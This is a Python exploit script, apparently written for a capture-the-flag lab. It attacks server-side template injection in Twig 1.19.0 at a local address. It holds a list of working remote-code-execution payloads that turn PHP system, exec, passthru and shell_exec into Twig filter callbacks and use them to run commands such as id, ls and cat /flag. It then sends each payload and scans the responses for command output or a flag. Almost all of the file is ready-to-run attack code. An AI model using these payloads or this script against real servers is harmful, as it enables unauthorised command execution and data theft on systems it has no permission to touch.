import requests
import re

BASE_URL = "http://127.0.0.1:8080/"

print("[*] Twig 1.19.0 SSTI RCE Exploitation")
print("[*] Using registerUndefinedFilterCallback technique")
print("=" * 80)

# The exploitation chain for Twig 1.x:
# 1. Register 'system' or 'exec' as undefined filter callback
# 2. Use a non-existent filter - this will call our registered callback
# 3. The callback (system/exec) will execute our command

rce_payloads = [
    # Classic Twig 1.x RCE chain
    ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", 
     "Register exec + trigger with non-existent filter"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}", 
     "Register system + trigger with non-existent filter"),
    
    # Alternative: use it directly after registration
    ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{['id']|nonexistent}}", 
     "Register exec + use non-existent filter on array"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{['id']|nonexistent}}", 
     "Register system + use non-existent filter on array"),
    
    # Try with command in string
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{['cat /flag']|nonexistent}}", 
     "Register system + cat /flag via filter"),
    
    ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{['cat /flag']|xyz}}", 
     "Register exec + cat /flag via xyz filter"),
    
    # Try passthru
    ("{{_self.env.registerUndefinedFilterCallback('passthru')}}{{['id']|abc}}", 
     "Register passthru + id command"),
    
    ("{{_self.env.registerUndefinedFilterCallback('passthru')}}{{['cat /flag']|def}}", 
     "Register passthru + cat /flag"),
    
    # Try with shell_exec
    ("{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{['cat /flag']|test}}", 
     "Register shell_exec + cat /flag"),
    
    # Alternative syntax - direct string
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{'id'|nonexistent}}", 
     "Register system + string command via filter"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{'cat /flag'|xyz}}", 
     "Register system + cat /flag as string"),
    
    # Try listing directory first
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{'ls -la /'|test}}", 
     "Register system + ls root directory"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{'pwd'|test}}", 
     "Register system + pwd command"),
    
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{'whoami'|test}}", 
     "Register system + whoami command"),
]

flag_found = False
interesting_results = []

for payload, description in rce_payloads:
    try:
        response = requests.post(
            BASE_URL,
            data={'name': payload},
            timeout=10
        )
        
        # Check for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            flag_found = True
            print(f"\n{'='*80}")
            print(f"[!!!!! FLAG FOUND !!!!!]")
            print(f"{'='*80}")
            print(f"Description: {description}")
            print(f"Payload: {payload}")
            print(f"Status: {response.status_code} | Length: {len(response.text)}B")
            print(f"\nFlag: {flag_match.group(0)}")
            print(f"\nFull Response:\n{response.text}")
            print(f"{'='*80}")
            break
        
        # Check for command output indicators
        is_interesting = False
        reasons = []
        
        # Look for uid/gid output (from 'id' command)
        if re.search(r'uid=\d+|gid=\d+', response.text):
            is_interesting = True
            reasons.append("Command executed - uid/gid output detected")
        
        # Look for directory listing patterns
        if re.search(r'drwx|total \d+|-rw-', response.text):
            is_interesting = True
            reasons.append("Directory listing output detected")
        
        # Look for file paths
        if re.search(r'/[a-z]+/[a-z]+', response.text) and 'vendor' not in response.text:
            is_interesting = True
            reasons.append("File path output detected")
        
        # Check for different response from baseline
        if len(response.text) > 200 and 'Fatal error' not in response.text and 'Twig_Error' not in response.text:
            is_interesting = True
            reasons.append("Unusual response length without error")
        
        if is_interesting:
            print(f"\n[INTERESTING] {description}")
            print(f"Payload: {payload}")
            print(f"Status: {response.status_code} | Length: {len(response.text)}B")
            print(f"Reasons: {', '.join(reasons)}")
            print(f"Response:\n{response.text}")
            interesting_results.append((payload, description, response.text))
        else:
            # Brief output for non-interesting
            error_snippet = ""
            if "Fatal error" in response.text:
                error_snippet = " [Error]"
            print(f"[.] {description[:60]:<60} | {response.status_code} | {len(response.text)}B{error_snippet}")
    
    except Exception as e:
        print(f"[ERROR] {description}")
        print(f"  Error: {str(e)}")

print("\n" + "=" * 80)
print(f"[SUMMARY]")
print(f"Total RCE payloads tested: {len(rce_payloads)}")
print(f"Interesting results: {len(interesting_results)}")
print(f"FLAG found: {flag_found}")

if not flag_found and interesting_results:
    print("\n[*] Interesting results found but no FLAG yet.")
    print("[*] Command execution may be working - need to refine payload.")
elif not flag_found:
    print("\n[*] No command execution detected with current payloads.")
    print("[*] May need alternative RCE technique for this Twig version.")

